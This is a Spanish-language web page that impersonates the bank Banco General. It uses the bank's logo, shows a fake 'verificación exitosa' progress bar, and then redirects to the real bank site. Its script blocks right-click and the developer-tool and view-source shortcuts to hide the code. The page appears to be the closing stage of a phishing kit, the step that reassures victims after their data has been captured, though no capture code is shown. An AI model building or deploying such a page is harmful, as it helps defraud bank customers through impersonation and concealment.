<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>PA</title>

  <style>
    :root {
      --blue: #0b5ea8;
      --light-gray: #f6f6f6;
      --card-bg: #ffffff;
      --accent: #e8a23b;
      --max-width: 980px;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial;
    }

    html, body {
      height: 100%;
      margin: 0;
      background: var(--light-gray);
      display: flex;
      flex-direction: column;
    }

    /* FRANJAS AZULES */
    .top-bar, .bottom-bar {
      background: var(--blue);
      color: #fff;
      padding: 0;
    }

    .top-bar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      height: 70px;
      padding: 0 10px;
    }

    .top-bar img {
      height: 100%;
      width: auto;
      object-fit: contain;
      display: block;
      margin-right: -25px;
    }

    .contact {
      font-size: 15px;
    }

    /* CONTENIDO CENTRAL */
    main.wrapper {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .card {
      background: var(--card-bg);
      width: 100%;
      max-width: 500px;
      padding: 34px 40px;
      border-radius: 4px;
      box-shadow: 0 1px 0 rgba(0,0,0,0.05);
      border-top: 4px solid var(--accent);
    }

    .title {
      text-align: center;
      font-size: 28px;
      color: var(--blue);
      margin: 4px 0 18px;
    }

    form {
      max-width: 420px;
      margin: 0 auto;
    }

    input[type="email"] , input[type="text"]  {
      width: 100%;
      padding: 10px 12px;
      font-size: 15px;
      border: 1px solid #cfcfcf;
      border-radius: 3px;
      box-sizing: border-box;
    }

    .btn {
      width: 100%;
      margin-top: 16px;
      padding: 12px;
      background: var(--blue);
      color: #fff;
      border-radius: 6px;
      border: none;
      cursor: pointer;
      font-weight: 600;
      font-size: 15px;
    }

    .help {
      text-align: center;
      margin-top: 14px;
      color: #666;
      font-size: 14px;
    }

    .note {
      text-align: center;
      color: #666;
      margin-top: 12px;
      font-size: 13px;
    }

    .bottom-bar {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 50px;
      font-size: 14px;
    }

    /* MODO TELÉFONO */
    @media (max-width: 800px) {
      .top-bar {
        flex-direction: column;
        height: auto;
        padding: 0;
      }

      .top-bar img {
        width: 100%;
        height: auto;
        max-height: none;
        object-fit: cover;
        margin-right: 0;
      }

      .contact {
        display: none;
      }

      .card {
        padding: 26px 18px;
      }

      .title {
        font-size: 22px;
      }
    }

    @media (max-width: 420px) {
      .title {
        font-size: 20px;
      }
    }


    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .progress-container {
      width: 100%;
    }

    .progress-bar {
      width: 100%;
      height: 20px;
      background-color: #B5B1B1;
      border-radius: 10px;
      overflow: hidden;
      margin-top: 10px;
    }

    .progress {
      background-color: #0b5ea8;
      height: 100%;
      width: 0%;
      transition: width 0.3s ease;
    }

    .percent {
      font-size: 18px;
      margin-top: 10px;
      color: #333;
    }
  </style>



<script> 
    // Bloquear clic derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
    document.onkeydown = function(e) {
        if (
            e.keyCode == 123 || // F12
            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
        ) {
            e.preventDefault();
            return false;
        }
    }
</script>

</head>
<body>
  <div class="top-bar">
    <img src="bg1.png" alt="bg">
    <div class="contact">¿Necesitas ayuda? Llama al 800-0000</div>
  </div>

  <main class="wrapper" role="main">
    <section class="card" aria-labelledby="page-title">
      
  <div class="box">
    <div class="circle-container">
      <div class="circle-rotating"></div>
      <div class="circle-content">

<p style="text-align: center;"><img src="https://play-lh.googleusercontent.com/BriLZJ00-26qxcTApps1I5ODDvybZprttVLhe7bk6-9aKDQFs2HDaO6PA8qa7anp1Q" alt="Banco General CR - Apps on Google Play" width="104" height="104" /></p>

<h3 style="text-align: center;">Banco General | Verificaci&oacute;n exitosa</h3>
      </div>
    </div>

    <div class="progress-container">
<div id="percentText" class="percent" style="text-align: center;">0%</div>

      <div class="progress-bar">
        <div class="progress" id="progressBar"></div>
      </div>
    </div>
  </div>

  <script>
    let percent = 0;
    const percentText = document.getElementById("percentText");
    const progressBar = document.getElementById("progressBar");

    const interval = setInterval(() => {
      percent++;
      percentText.textContent = percent + "%";
      progressBar.style.width = percent + "%";

      if (percent >= 100) {
        clearInterval(interval);
        window.location.href = "https://www.bgeneral.com/";
      }

}, 100); // 100 x 100ms = 10,000ms = 100 segundos

  </script>


        </p>




      <div class="help"> </div>
<p class="note"> </p>
    </section>
  </main>

  <div class="bottom-bar">
    © 2026 - Todos los Derechos reservados
  </div>






</body>
</html>
